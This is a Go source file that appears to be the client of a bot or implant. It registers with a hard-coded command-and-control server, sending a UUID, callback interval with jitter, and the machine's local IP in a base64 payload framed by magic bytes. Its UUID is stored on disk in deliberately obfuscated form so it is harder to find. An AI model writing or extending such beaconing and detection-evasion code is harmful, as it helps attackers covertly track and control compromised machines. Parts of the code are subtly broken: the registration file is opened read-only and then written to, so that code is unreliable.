package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/google/uuid"
)

// HOST : server to call
var serv = "192.168.206.183:5656"

// MAGIC : the shared hex byte that will signify the start of each MAD payload
var MAGIC = []byte{0xAA}

// MAGICBYTE is the single byte (rather than a byte array)
var MAGICBYTE = MAGIC[0]

//MAGICSTR is the ascii representation of the magic byte
var MAGICSTR = string(MAGIC)

// MAGICTERM : the shared hex byte that will signify the end of each MAD payload
var MAGICTERM = []byte{0xAB}

// MAGICTERMBYTE is the single byte (rather than a byte array)
var MAGICTERMBYTE = MAGICTERM[0]

//MAGICTERMSTR is the ascii representation of the magic byte
var MAGICTERMSTR = string(MAGICTERM)

//REGFILE is where the registration info for this bot is kept
var REGFILE = "/path/to/reg/file"

//INTERVAL is how long the sleep is between callbacks (if run in loop mode)
var INTERVAL = 60

//DELTA is the +/- variance in interval time
var DELTA = 5

//OBFSEED is the seed int that will get used for uuid obfuscation
var OBFSEED = 5

//OBFTEXT is the seed text that will get used for uuid obfuscation
var OBFTEXT = "test"

func sendData(data string) string {
	payload := encodePayload(data)
	fmt.Printf("sending: %s\n", payload)
	conn, err := net.Dial("tcp4", serv)
	if err != nil {
		panic(err)
	}
	outText := []byte(payload)
	conn.Write(outText)
	message, err := bufio.NewReader(conn).ReadString(MAGICTERMBYTE)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	respStr := string(message)
	conn.Close()
	return respStr
}

// base64 the payload and prepend/append magic chars
func encodePayload(data string) string {
	encStr := base64.StdEncoding.EncodeToString([]byte(data))
	fin := MAGICSTR + encStr + MAGICTERMSTR
	return fin
}

func checkRegStatus() bool {
	if _, err := os.Stat(REGFILE); os.IsNotExist(err) {
		return false
	}
	return true
}

func register() string {
	uid := uuid.New().String()
	storeUUID(uid)
	hn := getIP()
	intrv := strconv.Itoa(INTERVAL)
	dlt := strconv.Itoa(DELTA)
	payload := uid + "||" + intrv + "||" + dlt + "||" + hn
	ret := sendData(payload)
	return ret
}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

func storeUUID(uid string) {
	obf := obfuscateUUID(uid, OBFSEED, OBFTEXT)
	f, _ := os.Open(REGFILE)
	io.WriteString(f, obf)
	f.Close()
	return
}

func fetchUUID() string {
	obf, _ := ioutil.ReadFile(REGFILE)
	deobf := deobfuscateUUID(string(obf))
	return deobf
}

//modify it so you cant just search the filesystem for uuid formatted strings
func obfuscateUUID(uid string, seed int, text string) string {
	splituid := strings.Split(uid, "-")
	l1 := strings.Repeat(text, rand.Intn(seed))
	l2 := strings.Repeat(text, rand.Intn(seed))
	l3 := strings.Repeat(text, rand.Intn(seed))
	l4 := strings.Repeat(text, rand.Intn(seed))
	obf := splituid[0] + l1 + splituid[1] + splituid[2] + l2 + splituid[3] + l3 + splituid[4] + l4
	// its' really crappy obfuscation but it's a small deterrent
	return obf
}

//undo those modifications
func deobfuscateUUID(obf string) string {
	p := strings.Replace(obf, OBFTEXT, "", -1)
	p = p[:8] + "-" + p[8:]
	p = p[:13] + "-" + p[13:]
	p = p[:18] + "-" + p[18:]
	p = p[:23] + "-" + p[23:]
	return p
}

func main() {
	a := register()
	fmt.Printf("GOT: %s\n", a)
}
